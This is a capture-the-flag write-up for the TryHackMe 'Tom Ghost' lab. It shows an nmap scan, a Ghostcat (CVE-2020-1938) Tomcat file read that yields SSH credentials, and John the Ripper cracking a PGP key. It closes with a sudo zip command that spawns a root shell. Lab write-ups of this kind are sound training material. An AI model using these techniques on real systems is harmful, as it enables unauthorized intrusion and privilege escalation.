# Tom Ghost

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/016dea7c96e8b422241016405b571c8b.jpeg)

## Difficulty = Easy

***

Running our nmap scan we have this :

```bash
# Nmap 7.94 scan initiated Sun Oct  1 19:26:10 2023 as: nmap -sVC -T4 -oN nmap.txt -v 10.10.153.250  
Increasing send delay for 10.10.153.250 from 0 to 5 due to 61 out of 151 dropped probes since last increase.  
Nmap scan report for 10.10.153.250  
Host is up (0.30s latency).  
Not shown: 996 closed tcp ports (conn-refused)  
PORT     STATE SERVICE    VERSION  
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)  
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)  
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)  
53/tcp   open  tcpwrapped  
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)  
| ajp-methods:    
|_  Supported methods: GET HEAD POST OPTIONS  
8080/tcp open  http       Apache Tomcat 9.0.30  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Apache Tomcat/9.0.30  
|_http-favicon: Apache Tomcat  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sun Oct  1 19:27:14 2023 -- 1 IP address (1 host up) scanned in 64.14 seconds
```

Running dir/file bruteforce we have series of entries


![](https://i.imgur.com/hlK7riR.png)

Checking all of these doesn't seem to give me good leads, Even tried logging in but we always have status code `404`

![](https://i.imgur.com/ImOPnKO.png)

Enumerated harder and found [this](https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md) , we have a **Ghostcat-Apache Tomcat AJP File Read/Inclusion Vulnerability**

![](https://i.pinimg.com/736x/77/2c/ab/772cab4b3b0153ef4d7c46a00ee76b91.jpg)

Running the exploit we found a password and username

![](https://i.imgur.com/QfXlS2m.png)

We can therefore login via `SSH`, since there is no where else to test the credential


![](https://i.imgur.com/nZvAe6G.png)

On `/home/skyfuck` directory we have a `tryhackme.asc` file 

![](https://i.imgur.com/7qeSxPf.png)

We can transfer this file to our target machine with `netcat` and then attempt to crack it

![](https://i.imgur.com/5ksLrIU.png)

First of all convert this `.asc` to a crack-able hash that `johntheripper` can understand

![](https://i.imgur.com/6EjYWxm.png)

Then we can crack it with the following syntax

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](https://i.imgur.com/d9My8Vw.png)

Next run the command on your target system -:

```bash
$ gpg --import tryhackme.asc
```

![](https://i.imgur.com/OzccMGj.png)

Then run this next and input the passphrase we got from `johntheripper` **(ale......)**

```bash
$ gpg --decrypt-files credential.pgp
```

![](https://i.imgur.com/RKGhO3o.png)

***

**_Note :_**

Here are the two articles i used to go about solving the `.asc` and `.pgp` mystery

- [Link 1](https://www.openwall.com/lists/john-users/2015/11/17/1)
- [Link 2](https://superuser.com/questions/414679/how-to-extract-files-from-pgp-file)

***

Looks like we have user, **merlin** credential


![](https://i.imgur.com/hscZ38V.png)

Now switch user to **merlin**

![](https://i.imgur.com/xy1xdSE.png)

Running `sudo -l` we have permissions to run `zip` with the `sudo` command


![](https://i.imgur.com/deRWpXl.png)

Using this payloads we got user, **root**

```bash
$ TF=$(mktemp -u)
$ sudo zip $TF /etc/hosts -T -TT 'sh #'
```

![](https://i.imgur.com/xUliSXS.png)

GG 🥳


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
